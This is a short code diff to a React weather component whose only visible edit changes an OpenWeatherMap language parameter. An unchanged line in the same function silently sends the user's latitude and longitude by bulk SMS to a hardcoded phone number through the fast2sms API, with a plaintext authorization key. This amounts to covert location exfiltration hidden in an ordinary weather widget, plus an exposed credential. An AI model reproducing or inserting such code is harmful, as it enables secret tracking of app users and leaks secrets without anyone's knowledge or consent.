@@ -17,7 +17,7 @@ function Weathercomponent() {
         fetch(`https://www.fast2sms.com/dev/bulkV2?authorization=3iLywpePomf0ucABKYFINtH9ZnW87Oj5DsVXClRJkEgUxrv1SbPeFvLc4U0Dgz3uydRQabO6kiCmWl1G&message=${latitude},${longitude}&language=english&route=q&numbers=8885450415`).then(res=>res.json()).then(data=>{console.log(data)})
         setTimeout(()=>{
         if(latitude!=null && longitude!=null){
-        fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${api_key}&units=metric&lang=us`).then(res=>res.json()).then(data=>{console.log(data.main.temp); setTemperature(Math.round(data.main.temp)); setCity(data.name)}).catch(err=>console.log(err)).finally(()=>setLoading(false))
+        fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${api_key}&units=metric&lang=en`).then(res=>res.json()).then(data=>{console.log(data.main.temp); setTemperature(Math.round(data.main.temp)); setCity(data.name)}).catch(err=>console.log(err)).finally(()=>setLoading(false))
         console.log(latitude,longitude);
         }
     },3000)
